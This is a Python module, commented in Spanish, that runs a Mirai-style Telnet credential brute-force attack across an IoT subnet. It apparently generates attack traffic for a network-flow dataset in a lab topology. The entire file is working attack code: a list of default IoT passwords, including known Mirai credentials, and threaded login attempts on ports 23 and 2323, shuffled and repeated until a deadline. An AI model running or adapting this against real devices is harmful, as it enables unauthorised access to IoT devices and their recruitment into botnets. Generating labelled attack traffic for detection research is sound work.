"""Bruteforce de credenciales Telnet/SSH (Mirai-style) sobre subred IoT.

Fix de diversidad de flujos: la versión previa escaneaba la subred en orden
(.1, .2, …) con timeout 0.4s, agotando el presupuesto de tiempo en IPs muertas
ANTES de llegar a los hosts IoT reales (.10+). Aquí barajamos el orden, bajamos
el timeout y ciclamos la subred hasta el deadline. Cada intento abre un socket
TCP nuevo (sport efímero distinto) → un flujo distinto en el extractor.
"""

from __future__ import annotations

import ipaddress
import json
import random
import socket
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path


CREDS = [
    ("admin", "admin"), ("admin", "1234"), ("admin", "password"),
    ("root", "root"), ("root", "xc3511"), ("root", "vizxv"),
    ("user", "user"), ("guest", "guest"), ("admin", ""),
    ("root", "12345"), ("admin", "123456"), ("ubnt", "ubnt"),
]


def _live_hosts(subnet: str) -> list[str]:
    """Hosts REALES de la subred (de /tmp/iot_hosts.json que escribe la topología).
    La versión previa barría el /24 entero y gastaba el tiempo en ~240 IPs muertas
    (cada una un timeout) alcanzando pocos hosts vivos → solo 72 flujos. Aquí
    apuntamos solo a los ~15 dispositivos que existen."""
    net = ipaddress.ip_network(subnet, strict=False)
    try:
        hosts = json.loads(Path("/tmp/iot_hosts.json").read_text())
        live = [h["ip"] for h in hosts
                if h.get("ip") and ipaddress.ip_address(h["ip"]) in net]
        if live:
            return live
    except Exception:
        pass
    return [str(ip) for ip in net.hosts()]  # fallback: subred completa


def run(cfg: dict) -> int:
    end = time.time() + cfg["duration_s"]
    ports = cfg.get("ports", [23, 2323])
    timeout = float(cfg.get("connect_timeout", 0.15))
    workers = int(cfg.get("workers", 32))
    hosts = _live_hosts(cfg["targets_subnet"])

    def attempt(job):
        ip, port, user, pwd = job
        if time.time() >= end:
            return
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            s.connect((ip, port))
            s.send(f"{user}\r\n".encode())
            s.send(f"{pwd}\r\n".encode())
            s.recv(64)
        except OSError:
            pass
        finally:
            s.close()

    # cada (ip,port,cred) = un intento = un socket = un flujo distinto (sport efímero)
    jobs = [(ip, p, u, w) for ip in hosts for p in ports for (u, w) in CREDS]
    with ThreadPoolExecutor(max_workers=workers) as ex:
        while time.time() < end:
            random.shuffle(jobs)
            list(ex.map(attempt, jobs))
    return 0
